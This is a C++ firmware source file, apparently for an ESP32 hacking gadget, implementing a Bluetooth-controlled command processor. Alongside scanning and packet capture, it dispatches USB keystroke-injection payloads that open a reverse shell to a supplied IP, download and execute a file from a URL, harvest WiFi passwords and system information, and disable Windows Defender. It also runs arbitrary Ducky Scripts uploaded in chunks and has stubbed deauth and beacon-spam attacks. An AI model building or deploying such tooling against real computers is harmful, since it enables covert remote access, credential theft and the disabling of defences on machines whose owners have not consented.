/**
 * Command Processor implementation
 */

#include "CommandProcessor.h"
#include <SD.h>
#include "USBKeyboard.h"
#include "SDCardManager.h"

CommandProcessor::CommandProcessor(BLEManager* ble, WiFiScanner* wifi, PacketMonitor* monitor,
                                 USBKeyboard* usb, SDCardManager* sd, DuckyScript* ducky) :
    bleManager(ble),
    wifiScanner(wifi),
    packetMonitor(monitor),
    usbKeyboard(usb),
    sdCard(sd),
    duckyScript(ducky),
    currentMode(MODE_IDLE),
    startTime(millis()),
    pendingDuckyScript(""),
    expectedChunks(0),
    receivedChunks(0),
    lastChunkTime(0) {
}

void CommandProcessor::init() {
    // Register command handlers
    commandHandlers[CMD_SCAN_WIFI] = [this](JsonVariant params) { handleScanWiFi(params); };
    commandHandlers[CMD_SCAN_BLE] = [this](JsonVariant params) { handleScanBLE(params); };
    commandHandlers[CMD_GET_STATUS] = [this](JsonVariant params) { handleGetStatus(params); };
    commandHandlers[CMD_SET_CHANNEL] = [this](JsonVariant params) { handleSetChannel(params); };
    commandHandlers[CMD_MONITOR_START] = [this](JsonVariant params) { handleMonitorStart(params); };
    commandHandlers[CMD_MONITOR_STOP] = [this](JsonVariant params) { handleMonitorStop(params); };
    commandHandlers[CMD_EXPORT_DATA] = [this](JsonVariant params) { handleExportData(params); };
    commandHandlers[CMD_CLEAR_DATA] = [this](JsonVariant params) { handleClearData(params); };
    
    // Advanced command handlers
    commandHandlers[CMD_DEAUTH_ATTACK] = [this](JsonVariant params) { handleDeauthAttack(params); };
    commandHandlers[CMD_BEACON_SPAM] = [this](JsonVariant params) { handleBeaconSpam(params); };
    commandHandlers[CMD_RICKROLL] = [this](JsonVariant params) { handleRickroll(params); };
    commandHandlers[CMD_PCAP_START] = [this](JsonVariant params) { handlePCAPStart(params); };
    commandHandlers[CMD_PCAP_STOP] = [this](JsonVariant params) { handlePCAPStop(params); };
    
    // USB HID command handlers
    commandHandlers[CMD_USB_SET_MODE] = [this](JsonVariant params) { handleUSBSetMode(params); };
    commandHandlers[CMD_USB_HID_EXECUTE] = [this](JsonVariant params) { handleUSBHIDExecute(params); };
    commandHandlers[CMD_USB_TYPE_STRING] = [this](JsonVariant params) { handleUSBTypeString(params); };
    commandHandlers[CMD_HOST_NET_SCAN] = [this](JsonVariant params) { handleHostNetworkScan(params); };
    commandHandlers[CMD_HOST_INFO] = [this](JsonVariant params) { handleHostSystemInfo(params); };
    
    // SD Card command handlers
    commandHandlers[CMD_SD_LIST_DIR] = [this](JsonVariant params) { handleSDListDir(params); };
    commandHandlers[CMD_SD_LIST_PAYLOADS] = [this](JsonVariant params) { handleSDListPayloads(params); };
    commandHandlers[CMD_SD_LOAD_PAYLOAD] = [this](JsonVariant params) { handleSDLoadPayload(params); };
    commandHandlers[CMD_SD_SAVE_PAYLOAD] = [this](JsonVariant params) { handleSDSavePayload(params); };
    commandHandlers[CMD_SD_DELETE_FILE] = [this](JsonVariant params) { handleSDDeleteFile(params); };
    commandHandlers[CMD_SD_GET_INFO] = [this](JsonVariant params) { handleSDGetInfo(params); };
    
    // Ducky Script command handlers
    commandHandlers[CMD_DUCKY_SCRIPT] = [this](JsonVariant params) { handleDuckyScript(params); };
    commandHandlers[CMD_DUCKY_STOP] = [this](JsonVariant params) { handleDuckyStop(params); };
    commandHandlers[CMD_DUCKY_CHUNK] = [this](JsonVariant params) { handleDuckyChunk(params); };
    
    Serial.println("Command processor initialized with advanced features");
}

void CommandProcessor::processCommand(const String& commandStr) {
    Serial.println("=== COMMAND PROCESSOR ===");
    Serial.printf("Received command string: '%s'\n", commandStr.c_str());
    Serial.printf("Command length: %d\n", commandStr.length());
    
    DynamicJsonDocument doc(512);
    DeserializationError error = deserializeJson(doc, commandStr);
    
    if (error) {
        Serial.printf("Failed to parse command: %s\n", error.c_str());
        Serial.printf("JSON Error code: %d\n", error.code());
        bleManager->sendError("", "Invalid JSON");
        return;
    }
    
    Serial.println("JSON parsed successfully");
    
    String cmd = doc[JSON_CMD] | "";
    if (cmd.isEmpty()) {
        bleManager->sendError("", "Missing command");
        return;
    }
    
    Serial.printf("Processing command: %s\n", cmd.c_str());
    
    // Find and execute handler
    auto it = commandHandlers.find(cmd);
    if (it != commandHandlers.end()) {
        JsonVariant params = doc[JSON_PARAMS];
        it->second(params);
    } else {
        bleManager->sendError(cmd, "Unknown command");
    }
}

void CommandProcessor::handleScanWiFi(JsonVariant params) {
    Serial.println("=== handleScanWiFi called ===");
    
    if (currentMode != MODE_IDLE) {
        Serial.printf("ERROR: Device busy, current mode: %d\n", currentMode);
        bleManager->sendError(CMD_SCAN_WIFI, "Device busy");
        return;
    }
    
    int duration = params["duration"] | 3000;
    int channel = params["channel"] | 0;
    
    Serial.printf("Scan params - duration: %d, channel: %d\n", duration, channel);
    
    currentMode = MODE_SCANNING;
    Serial.printf("Mode changed to: %d\n", currentMode);
    
    // Start scan
    if (wifiScanner->startScan(channel)) {
        // Don't send immediate response - wait for scan results
        // The main loop will send the results when scan completes
        Serial.println("WiFi scan started successfully");
    } else {
        currentMode = MODE_IDLE;
        Serial.println("ERROR: Failed to start WiFi scan!");
        bleManager->sendError(CMD_SCAN_WIFI, "Failed to start scan");
    }
}

void CommandProcessor::handleScanBLE(JsonVariant params) {
    // TODO: Implement BLE scanning
    bleManager->sendError(CMD_SCAN_BLE, "Not implemented yet");
}

void CommandProcessor::handleGetStatus(JsonVariant params) {
    DynamicJsonDocument status(512);
    
    status[JSON_UPTIME] = getUptime();
    status[JSON_FREE_HEAP] = getFreeHeap();
    status[JSON_BATTERY_LEVEL] = getBatteryLevel();
    status[JSON_CURRENT_MODE] = currentMode;
    status[JSON_SD_CARD_STATUS] = isSDCardPresent();
    status[JSON_WIFI_STATUS] = WiFi.isConnected();
    status[JSON_BLE_STATUS] = bleManager->isConnected();
    
    bleManager->sendResponse(CMD_GET_STATUS, STATUS_SUCCESS, status);
}

void CommandProcessor::handleSetChannel(JsonVariant params) {
    int channel = params["channel"] | 0;
    
    if (channel < 0 || channel > 14) {
        bleManager->sendError(CMD_SET_CHANNEL, "Invalid channel");
        return;
    }
    
    // TODO: Implement channel setting for monitor mode
    DynamicJsonDocument response(256);
    response["channel"] = channel;
    bleManager->sendResponse(CMD_SET_CHANNEL, STATUS_SUCCESS, response);
}

void CommandProcessor::handleMonitorStart(JsonVariant params) {
    if (currentMode != MODE_IDLE) {
        bleManager->sendError(CMD_MONITOR_START, "Device busy");
        return;
    }
    
    int channel = params["channel"] | 0;
    
    // Start packet monitoring
    if (packetMonitor->startMonitor(channel)) {
        currentMode = MODE_MONITORING;
        
        DynamicJsonDocument response(256);
        response["message"] = "Monitor mode started";
        response["channel"] = channel;
        bleManager->sendResponse(CMD_MONITOR_START, STATUS_SUCCESS, response);
        
        // Set up periodic stats updates
        // This will be handled in main loop
    } else {
        bleManager->sendError(CMD_MONITOR_START, "Failed to start monitor mode");
    }
}

void CommandProcessor::handleMonitorStop(JsonVariant params) {
    if (currentMode != MODE_MONITORING) {
        bleManager->sendError(CMD_MONITOR_STOP, "Not in monitor mode");
        return;
    }
    
    // Stop packet monitoring
    packetMonitor->stopMonitor();
    currentMode = MODE_IDLE;
    
    // Send final stats
    DynamicJsonDocument response(512);
    response["message"] = "Monitor mode stopped";
    response["stats"]["packets_total"] = packetMonitor->getPacketsTotal();
    response["stats"]["beacons"] = packetMonitor->getBeaconCount();
    response["stats"]["probes"] = packetMonitor->getProbeCount();
    response["stats"]["deauths"] = packetMonitor->getDeauthCount();
    response["stats"]["data"] = packetMonitor->getDataCount();
    
    bleManager->sendResponse(CMD_MONITOR_STOP, STATUS_SUCCESS, response);
}

void CommandProcessor::handleExportData(JsonVariant params) {
    if (!isSDCardPresent()) {
        bleManager->sendError(CMD_EXPORT_DATA, "SD card not present");
        return;
    }
    
    // TODO: Implement data export
    bleManager->sendError(CMD_EXPORT_DATA, "Not implemented yet");
}

void CommandProcessor::handleClearData(JsonVariant params) {
    // Clear any stored data
    wifiScanner->getResults().clear();
    
    DynamicJsonDocument response(256);
    response["message"] = "Data cleared";
    bleManager->sendResponse(CMD_CLEAR_DATA, STATUS_SUCCESS, response);
}

uint32_t CommandProcessor::getUptime() const {
    return millis() - startTime;
}

uint32_t CommandProcessor::getFreeHeap() const {
    return esp_get_free_heap_size();
}

uint8_t CommandProcessor::getBatteryLevel() const {
    // TODO: Implement battery monitoring
    return 100; // Dummy value
}

bool CommandProcessor::isSDCardPresent() const {
    return sdCard && sdCard->isInitialized();
}

// Advanced command handlers
void CommandProcessor::handleDeauthAttack(JsonVariant params) {
    if (currentMode != MODE_IDLE) {
        bleManager->sendError(CMD_DEAUTH_ATTACK, "Device busy");
        return;
    }
    
    String targetMAC = params["target"] | "";
    String apMAC = params["ap"] | "";
    int duration = params["duration"] | 10; // seconds
    
    if (targetMAC.isEmpty() || apMAC.isEmpty()) {
        bleManager->sendError(CMD_DEAUTH_ATTACK, "Missing target or AP MAC address");
        return;
    }
    
    currentMode = MODE_ATTACKING;
    
    DynamicJsonDocument response(256);
    response["message"] = "Deauth attack started";
    response["target"] = targetMAC;
    response["ap"] = apMAC;
    response["duration"] = duration;
    bleManager->sendResponse(CMD_DEAUTH_ATTACK, STATUS_SUCCESS, response);
    
    // TODO: Implement actual deauth attack using PacketMonitor
    
    currentMode = MODE_IDLE;
}

void CommandProcessor::handleBeaconSpam(JsonVariant params) {
    if (currentMode != MODE_IDLE) {
        bleManager->sendError(CMD_BEACON_SPAM, "Device busy");
        return;
    }
    
    JsonArray ssids = params["ssids"];
    int interval = params["interval"] | 100; // milliseconds
    
    if (!ssids || ssids.size() == 0) {
        bleManager->sendError(CMD_BEACON_SPAM, "No SSIDs provided");
        return;
    }
    
    currentMode = MODE_BEACON_SPAM;
    
    DynamicJsonDocument response(256);
    response["message"] = "Beacon spam started";
    response["count"] = ssids.size();
    response["interval"] = interval;
    bleManager->sendResponse(CMD_BEACON_SPAM, STATUS_SUCCESS, response);
    
    // TODO: Implement beacon spam using PacketMonitor
    
    currentMode = MODE_IDLE;
}

void CommandProcessor::handleRickroll(JsonVariant params) {
    if (currentMode != MODE_IDLE) {
        bleManager->sendError(CMD_RICKROLL, "Device busy");
        return;
    }
    
    // Rickroll SSIDs
    const char* rickrollSSIDs[] = {
        "Never Gonna Give You Up",
        "Never Gonna Let You Down",
        "Never Gonna Run Around",
        "Never Gonna Desert You",
        "Never Gonna Make You Cry",
        "Never Gonna Say Goodbye",
        "Never Gonna Tell a Lie",
        "Never Gonna Hurt You",
        "Rick Astley Free WiFi",
        "You've Been Rickrolled"
    };
    
    currentMode = MODE_BEACON_SPAM;
    
    DynamicJsonDocument response(256);
    response["message"] = "Rickroll beacon spam started";
    response["song"] = "Never Gonna Give You Up";
    bleManager->sendResponse(CMD_RICKROLL, STATUS_SUCCESS, response);
    
    // TODO: Implement rickroll beacon spam
    
    currentMode = MODE_IDLE;
}

void CommandProcessor::handlePCAPStart(JsonVariant params) {
    if (!isSDCardPresent()) {
        bleManager->sendError(CMD_PCAP_START, "SD card not present");
        return;
    }
    
    if (packetMonitor->isPCAPActive()) {
        bleManager->sendError(CMD_PCAP_START, "PCAP already active");
        return;
    }
    
    String filename = params["filename"] | "capture.pcap";
    
    if (packetMonitor->startPCAP(filename.c_str())) {
        DynamicJsonDocument response(256);
        response["message"] = "PCAP capture started";
        response["filename"] = filename;
        bleManager->sendResponse(CMD_PCAP_START, STATUS_SUCCESS, response);
    } else {
        bleManager->sendError(CMD_PCAP_START, "Failed to start PCAP capture");
    }
}

void CommandProcessor::handlePCAPStop(JsonVariant params) {
    if (!packetMonitor->isPCAPActive()) {
        bleManager->sendError(CMD_PCAP_STOP, "PCAP not active");
        return;
    }
    
    packetMonitor->stopPCAP();
    
    DynamicJsonDocument response(256);
    response["message"] = "PCAP capture stopped";
    bleManager->sendResponse(CMD_PCAP_STOP, STATUS_SUCCESS, response);
}

// USB HID command handlers
void CommandProcessor::handleUSBSetMode(JsonVariant params) {
    String mode = params["mode"] | "";
    
    if (mode == "keyboard") {
        if (usbKeyboard && usbKeyboard->begin()) {
            DynamicJsonDocument response(256);
            response["message"] = "USB keyboard mode enabled";
            bleManager->sendResponse(CMD_USB_SET_MODE, STATUS_SUCCESS, response);
        } else {
            bleManager->sendError(CMD_USB_SET_MODE, "Failed to enable USB keyboard");
        }
    } else if (mode == "disabled") {
        if (usbKeyboard) {
            usbKeyboard->end();
        }
        DynamicJsonDocument response(256);
        response["message"] = "USB mode disabled";
        bleManager->sendResponse(CMD_USB_SET_MODE, STATUS_SUCCESS, response);
    } else {
        bleManager->sendError(CMD_USB_SET_MODE, "Invalid mode");
    }
}

void CommandProcessor::handleUSBHIDExecute(JsonVariant params) {
    if (!usbKeyboard || !usbKeyboard->isInitialized()) {
        bleManager->sendError(CMD_USB_HID_EXECUTE, "USB keyboard not initialized");
        return;
    }
    
    String payload = params["payload"] | "";
    
    if (payload == "network_scan") {
        usbKeyboard->runNetworkScan();
    } else if (payload == "system_info") {
        usbKeyboard->harvestSystemInfo();
    } else if (payload == "wifi_passwords") {
        usbKeyboard->harvestWifiPasswords();
    } else if (payload == "reverse_shell") {
        String ip = params["ip"] | "";
        int port = params["port"] | 4444;
        if (!ip.isEmpty()) {
            usbKeyboard->createReverseShell(ip.c_str(), port);
        } else {
            bleManager->sendError(CMD_USB_HID_EXECUTE, "Missing IP for reverse shell");
            return;
        }
    } else if (payload == "download_execute") {
        String url = params["url"] | "";
        if (!url.isEmpty()) {
            usbKeyboard->downloadAndExecute(url.c_str());
        } else {
            bleManager->sendError(CMD_USB_HID_EXECUTE, "Missing URL");
            return;
        }
    } else if (payload == "disable_defender") {
        usbKeyboard->disableDefender();
    } else if (payload == "lock_workstation") {
        usbKeyboard->lockWorkstation();
    } else if (payload == "minimize_windows") {
        usbKeyboard->minimizeAllWindows();
    } else if (payload == "screenshot") {
        usbKeyboard->takeScreenshot();
    } else {
        bleManager->sendError(CMD_USB_HID_EXECUTE, "Unknown payload");
        return;
    }
    
    DynamicJsonDocument response(256);
    response["message"] = "Payload executed";
    response["payload"] = payload;
    bleManager->sendResponse(CMD_USB_HID_EXECUTE, STATUS_SUCCESS, response);
}

void CommandProcessor::handleUSBTypeString(JsonVariant params) {
    if (!usbKeyboard || !usbKeyboard->isInitialized()) {
        bleManager->sendError(CMD_USB_TYPE_STRING, "USB keyboard not initialized");
        return;
    }
    
    String text = params["text"] | "";
    if (text.isEmpty()) {
        bleManager->sendError(CMD_USB_TYPE_STRING, "No text provided");
        return;
    }
    
    usbKeyboard->typeString(text.c_str());
    
    DynamicJsonDocument response(256);
    response["message"] = "Text typed";
    response["length"] = text.length();
    bleManager->sendResponse(CMD_USB_TYPE_STRING, STATUS_SUCCESS, response);
}

void CommandProcessor::handleHostNetworkScan(JsonVariant params) {
    if (!usbKeyboard || !usbKeyboard->isInitialized()) {
        bleManager->sendError(CMD_HOST_NET_SCAN, "USB keyboard not initialized");
        return;
    }
    
    // This will run network scan commands on the host
    usbKeyboard->runNetworkScan();
    
    DynamicJsonDocument response(256);
    response["message"] = "Host network scan initiated";
    response["note"] = "Check host terminal for results";
    bleManager->sendResponse(CMD_HOST_NET_SCAN, STATUS_SUCCESS, response);
}

void CommandProcessor::handleHostSystemInfo(JsonVariant params) {
    if (!usbKeyboard || !usbKeyboard->isInitialized()) {
        bleManager->sendError(CMD_HOST_INFO, "USB keyboard not initialized");
        return;
    }
    
    // This will harvest system information from the host
    usbKeyboard->harvestSystemInfo();
    
    DynamicJsonDocument response(256);
    response["message"] = "Host system info harvest initiated";
    response["note"] = "Check host terminal for results";
    bleManager->sendResponse(CMD_HOST_INFO, STATUS_SUCCESS, response);
}

// SD Card command handlers
void CommandProcessor::handleSDListDir(JsonVariant params) {
    if (!sdCard || !sdCard->isInitialized()) {
        bleManager->sendError(CMD_SD_LIST_DIR, "SD card not initialized");
        return;
    }
    
    String path = params["path"] | "/mct2032";
    DynamicJsonDocument files(2048);
    // For now, return empty array - implement directory listing later
    files.to<JsonArray>();
    
    DynamicJsonDocument response(2048);
    response["path"] = path;
    response["files"] = files;
    bleManager->sendResponse(CMD_SD_LIST_DIR, STATUS_SUCCESS, response);
}

void CommandProcessor::handleSDListPayloads(JsonVariant params) {
    if (!sdCard || !sdCard->isInitialized()) {
        bleManager->sendError(CMD_SD_LIST_PAYLOADS, "SD card not initialized");
        return;
    }
    
    String os = params["os"] | "";
    std::vector<String> payloadList = sdCard->listPayloads(os.isEmpty() ? nullptr : os.c_str());
    
    DynamicJsonDocument payloads(2048);
    JsonArray arr = payloads.to<JsonArray>();
    for (const String& p : payloadList) {
        arr.add(p);
    }
    
    DynamicJsonDocument response(2048);
    response["os"] = os;
    response["payloads"] = payloads;
    bleManager->sendResponse(CMD_SD_LIST_PAYLOADS, STATUS_SUCCESS, response);
}

void CommandProcessor::handleSDLoadPayload(JsonVariant params) {
    if (!sdCard || !sdCard->isInitialized()) {
        bleManager->sendError(CMD_SD_LOAD_PAYLOAD, "SD card not initialized");
        return;
    }
    
    String os = params["os"] | "";
    String name = params["name"] | "";
    
    if (os.isEmpty() || name.isEmpty()) {
        bleManager->sendError(CMD_SD_LOAD_PAYLOAD, "Missing OS or payload name");
        return;
    }
    
    String content = sdCard->loadPayload(os.c_str(), name.c_str());
    if (content.isEmpty()) {
        bleManager->sendError(CMD_SD_LOAD_PAYLOAD, "Failed to load payload");
        return;
    }
    
    DynamicJsonDocument response(4096);
    response["os"] = os;
    response["name"] = name;
    response["content"] = content;
    bleManager->sendResponse(CMD_SD_LOAD_PAYLOAD, STATUS_SUCCESS, response);
}

void CommandProcessor::handleSDSavePayload(JsonVariant params) {
    if (!sdCard || !sdCard->isInitialized()) {
        bleManager->sendError(CMD_SD_SAVE_PAYLOAD, "SD card not initialized");
        return;
    }
    
    String os = params["os"] | "";
    String name = params["name"] | "";
    String content = params["content"] | "";
    
    if (os.isEmpty() || name.isEmpty() || content.isEmpty()) {
        bleManager->sendError(CMD_SD_SAVE_PAYLOAD, "Missing required parameters");
        return;
    }
    
    if (sdCard->savePayload(os.c_str(), name.c_str(), content.c_str())) {
        DynamicJsonDocument response(256);
        response["message"] = "Payload saved";
        response["os"] = os;
        response["name"] = name;
        bleManager->sendResponse(CMD_SD_SAVE_PAYLOAD, STATUS_SUCCESS, response);
    } else {
        bleManager->sendError(CMD_SD_SAVE_PAYLOAD, "Failed to save payload");
    }
}

void CommandProcessor::handleSDDeleteFile(JsonVariant params) {
    if (!sdCard || !sdCard->isInitialized()) {
        bleManager->sendError(CMD_SD_DELETE_FILE, "SD card not initialized");
        return;
    }
    
    String filepath = params["path"] | "";
    if (filepath.isEmpty()) {
        bleManager->sendError(CMD_SD_DELETE_FILE, "Missing file path");
        return;
    }
    
    if (sdCard->deleteFile(filepath.c_str())) {
        DynamicJsonDocument response(256);
        response["message"] = "File deleted";
        response["path"] = filepath;
        bleManager->sendResponse(CMD_SD_DELETE_FILE, STATUS_SUCCESS, response);
    } else {
        bleManager->sendError(CMD_SD_DELETE_FILE, "Failed to delete file");
    }
}

void CommandProcessor::handleSDGetInfo(JsonVariant params) {
    if (!sdCard || !sdCard->isInitialized()) {
        bleManager->sendError(CMD_SD_GET_INFO, "SD card not initialized");
        return;
    }
    
    DynamicJsonDocument response(512);
    // For now, return dummy values
    response["total_size_mb"] = 16384; // 16GB
    response["used_size_mb"] = 1024;   // 1GB used
    response["free_size_mb"] = 15360;  // 15GB free
    response["initialized"] = true;
    
    bleManager->sendResponse(CMD_SD_GET_INFO, STATUS_SUCCESS, response);
}

// Ducky Script command handlers
void CommandProcessor::handleDuckyScript(JsonVariant params) {
    if (!usbKeyboard || !usbKeyboard->isInitialized()) {
        bleManager->sendError(CMD_DUCKY_SCRIPT, "USB keyboard not initialized");
        return;
    }
    
    if (!duckyScript) {
        bleManager->sendError(CMD_DUCKY_SCRIPT, "Ducky Script not initialized");
        return;
    }
    
    String script = params["script"] | "";
    String type = params["type"] | "";
    
    if (script.isEmpty() && type.isEmpty()) {
        bleManager->sendError(CMD_DUCKY_SCRIPT, "No script or type provided");
        return;
    }
    
    // Load predefined script if type is specified
    if (!type.isEmpty()) {
        if (type == "windows_recon") {
            script = DuckyScript::getWindowsReconScript();
        } else if (type == "wifi_passwords") {
            script = DuckyScript::getWiFiPasswordScript();
        } else if (type == "reverse_shell") {
            String ip = params["ip"] | "";
            int port = params["port"] | 4444;
            if (ip.isEmpty()) {
                bleManager->sendError(CMD_DUCKY_SCRIPT, "IP required for reverse shell");
                return;
            }
            script = DuckyScript::getReverseShellScript(ip.c_str(), port);
        } else if (type == "rickroll") {
            script = DuckyTemplates::RICKROLL;
        } else {
            bleManager->sendError(CMD_DUCKY_SCRIPT, "Unknown script type");
            return;
        }
    }
    
    // Load and execute the script
    if (duckyScript->loadScript(script)) {
        DynamicJsonDocument response(256);
        response["message"] = "Ducky Script loaded and executing";
        response["instructions"] = duckyScript->getInstructionCount();
        bleManager->sendResponse(CMD_DUCKY_SCRIPT, STATUS_SUCCESS, response);
        
        // Run the script (this will block until complete)
        duckyScript->run();
        
        // Send completion notification
        DynamicJsonDocument complete(256);
        complete["message"] = "Ducky Script execution complete";
        bleManager->sendResponse(CMD_DUCKY_SCRIPT, STATUS_SUCCESS, complete);
    } else {
        bleManager->sendError(CMD_DUCKY_SCRIPT, "Failed to load script");
    }
}

void CommandProcessor::handleDuckyStop(JsonVariant params) {
    if (!duckyScript) {
        bleManager->sendError(CMD_DUCKY_STOP, "Ducky Script not initialized");
        return;
    }
    
    duckyScript->stop();
    
    DynamicJsonDocument response(256);
    response["message"] = "Ducky Script stopped";
    response["progress"] = duckyScript->getProgress();
    bleManager->sendResponse(CMD_DUCKY_STOP, STATUS_SUCCESS, response);
}

void CommandProcessor::handleDuckyChunk(JsonVariant params) {
    Serial.println("=== DUCKY CHUNK HANDLER ===");
    
    int chunkIndex = params["chunkIndex"] | -1;
    int totalChunks = params["totalChunks"] | 0;
    String chunkData = params["data"] | "";
    bool isStart = params["start"] | false;
    bool isEnd = params["end"] | false;
    
    Serial.printf("Chunk %d/%d, data length: %d\n", chunkIndex, totalChunks, chunkData.length());
    
    // Initialize chunking on first chunk
    if (isStart || (chunkIndex == 0 && totalChunks > 0)) {
        Serial.println("Starting new chunked Ducky Script");
        pendingDuckyScript = "";
        expectedChunks = totalChunks;
        receivedChunks = 0;
        lastChunkTime = millis();
    }
    
    // Check for timeout (10 seconds)
    if (millis() - lastChunkTime > 10000) {
        Serial.println("Chunk timeout - resetting");
        pendingDuckyScript = "";
        expectedChunks = 0;
        receivedChunks = 0;
        bleManager->sendError(CMD_DUCKY_CHUNK, "Chunk timeout");
        return;
    }
    
    // Append chunk data
    pendingDuckyScript += chunkData;
    receivedChunks++;
    lastChunkTime = millis();
    
    Serial.printf("Received chunk %d, total script length: %d\n", receivedChunks, pendingDuckyScript.length());
    
    // Send acknowledgment
    DynamicJsonDocument ack(256);
    ack["message"] = "Chunk received";
    ack["chunkIndex"] = chunkIndex;
    ack["receivedChunks"] = receivedChunks;
    ack["expectedChunks"] = expectedChunks;
    bleManager->sendResponse(CMD_DUCKY_CHUNK, STATUS_SUCCESS, ack);
    
    // Check if all chunks received
    if (isEnd || (expectedChunks > 0 && receivedChunks >= expectedChunks)) {
        Serial.println("All chunks received, executing Ducky Script");
        Serial.printf("Final script length: %d\n", pendingDuckyScript.length());
        
        // Execute the complete script
        if (!usbKeyboard || !usbKeyboard->isInitialized()) {
            bleManager->sendError(CMD_DUCKY_CHUNK, "USB keyboard not initialized");
            pendingDuckyScript = "";
            expectedChunks = 0;
            receivedChunks = 0;
            return;
        }
        
        if (!duckyScript) {
            bleManager->sendError(CMD_DUCKY_CHUNK, "Ducky Script not initialized");
            pendingDuckyScript = "";
            expectedChunks = 0;
            receivedChunks = 0;
            return;
        }
        
        // Load and execute the complete script
        if (duckyScript->loadScript(pendingDuckyScript)) {
            DynamicJsonDocument response(256);
            response["message"] = "Ducky Script loaded from chunks and executing";
            response["instructions"] = duckyScript->getInstructionCount();
            response["totalLength"] = pendingDuckyScript.length();
            bleManager->sendResponse(CMD_DUCKY_CHUNK, STATUS_SUCCESS, response);
            
            // Run the script (this will block until complete)
            duckyScript->run();
            
            // Send completion notification
            DynamicJsonDocument complete(256);
            complete["message"] = "Ducky Script execution complete";
            bleManager->sendResponse(CMD_DUCKY_CHUNK, STATUS_SUCCESS, complete);
        } else {
            bleManager->sendError(CMD_DUCKY_CHUNK, "Failed to load assembled script");
        }
        
        // Reset chunking state
        pendingDuckyScript = "";
        expectedChunks = 0;
        receivedChunks = 0;
    }
}